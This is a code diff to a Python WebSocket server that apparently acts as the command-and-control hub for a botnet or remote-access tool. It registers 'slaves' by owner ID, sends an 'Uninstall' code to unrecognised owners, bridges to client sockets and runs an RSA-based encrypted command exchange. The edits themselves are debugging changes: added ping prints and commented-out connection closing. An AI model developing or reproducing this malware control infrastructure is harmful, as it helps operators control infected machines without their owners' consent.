@@ -18,6 +18,7 @@ async def ping_pong(ws, ip_port):
     """Ping-pong mechanism to keep the connection alive."""
     try:
         while True:
+            print("sent ping")
             await ws.send_str("0x00")
             await asyncio.sleep(15)
     except Exception as e:
@@ -39,13 +40,13 @@ async def process_encrypted_commands(ws, identifier, cmd, owner_id):
         }
         if owner_id not in owner_ids:
             await ws.send_str("8x88")  # Uninstall
-            ws.close()
-            return False
+            #ws.close()
+            #return False
         if connection_info not in slaves:
             slaves.append(connection_info)  # Add to the shared slaves array
             ws_slaves.append({"identifier": identifier, "owner_id": owner_id, "ws": ws})  # Add to ws_slaves
             print(f"Added connection info: {connection_info}")
-            ping_pong_tasks[ip_port] = asyncio.create_task(ping_pong(ws, ip_port))  # Start ping-pong task
+            #ping_pong_tasks[ip_port] = asyncio.create_task(ping_pong(ws, ip_port))
         await ws.send_str(end.encrypt("0x01|OK", args[1]))
     elif args[0] == "5x55":  # Bridge to a client WebSocket
         owner_id = None
@@ -113,6 +114,8 @@ async def websocket_handler(request):
                 print(msg.data)
                 if msg.data == "0x00":  # Ping
                     await ws.send_str("0x01")  # Pong
+                elif msg.data == "0x01":
+                    print("ping received")
                 elif msg.data.startswith("1x00|"):  # Init, respond with public key
                     private_key, public_key = rsa.generate_keys()
                     await ws.send_str(f"1x01|{public_key[0]},{public_key[1]}")
